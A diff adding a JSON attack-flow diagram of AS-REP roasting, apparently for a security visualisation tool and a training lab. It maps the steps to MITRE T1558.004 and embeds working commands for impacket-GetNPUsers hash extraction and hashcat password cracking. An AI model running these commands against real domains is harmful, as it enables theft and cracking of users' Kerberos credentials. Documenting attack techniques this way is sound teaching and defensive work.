@@ -1,0 +1,142 @@
+{
+  "title": "AS-REP Roasting (GetNPUsers)",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "getnpusers_tool",
+        "asrep_hashes",
+        "cracked_passwords"
+      ],
+      "position": {
+        "x": 199.72179018960895,
+        "y": -34.90143586501382
+      }
+    },
+    {
+      "id": "getnpusers_tool",
+      "label": "GetNPUsers.py",
+      "icon": "IconTerminal",
+      "type": "node",
+      "position": {
+        "x": 175.22336233457187,
+        "y": -139.23274124680106
+      }
+    },
+    {
+      "id": "asrep_hashes",
+      "label": "AS-REP Hashes",
+      "icon": "IconData",
+      "type": "node",
+      "position": {
+        "x": 116.72807876946084,
+        "y": 44.42986951677341
+      }
+    },
+    {
+      "id": "cracked_passwords",
+      "label": "Cracked Passwords",
+      "icon": "IconKey",
+      "type": "node",
+      "position": {
+        "x": 272.7155016097571,
+        "y": -4.001709348963654
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "icon": "IconNetwork",
+      "type": "container",
+      "members": [
+        "domain_controller"
+      ]
+    },
+    {
+      "id": "domain_controller",
+      "label": "Domain Controller (KDC)",
+      "icon": "IconServer",
+      "type": "node",
+      "position": {
+        "x": -173.59890606420058,
+        "y": -6.918796980819593
+      }
+    }
+  ],
+  "visibility": {
+    "asrep_hashes": {
+      "start": 4,
+      "end": 100
+    },
+    "cracked_passwords": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Launch GetNPUsers",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "getnpusers_tool",
+      "description": "The attacker starts GetNPUsers without supplying a password to request roastable AS-REP material.",
+      "cli": "impacket-GetNPUsers spookysec.local/username -dc-ip 10.80.167.130 -request -no-pass -format hashcat -outputfile attractive-kerb-hash.txt"
+    },
+    {
+      "id": 2,
+      "name": "Reach KDC Service Path",
+      "type": "edge",
+      "from": "getnpusers_tool",
+      "to": "corporate_network",
+      "description": "The GetNPUsers client reaches the Kerberos service path exposed by the domain."
+    },
+    {
+      "id": 3,
+      "name": "Request Roastable AS-REP Data",
+      "mitre": {
+        "id": "T1558.004",
+        "tactic": "Credential Access",
+        "technique": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+      },
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "domain_controller",
+      "description": "The KDC returns AS-REP material for misconfigured users with preauthentication disabled."
+    },
+    {
+      "id": 4,
+      "name": "Save AS-REP Hashes",
+      "type": "edge",
+      "from": "domain_controller",
+      "to": "asrep_hashes",
+      "description": "The roastable Kerberos material is saved locally in a format suitable for Hashcat."
+    },
+    {
+      "id": 5,
+      "name": "Crack Recovered Material",
+      "type": "edge",
+      "from": "asrep_hashes",
+      "to": "cracked_passwords",
+      "description": "Hashcat attacks the captured AS-REP material to recover plaintext passwords.",
+      "cli": "hashcat -m 18200 attractive-kerb-hash.txt /usr/share/wordlists/rockyou.txt --force"
+    }
+  ],
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": true,
+  "viewport": {
+    "zoom": 1.27,
+    "pan": {
+      "x": 583.5,
+      "y": 354.5
+    }
+  },
+  "stepInfoPosition": {
+    "x": 737.1157531738281,
+    "y": 794.7122192382812
+  }
+}
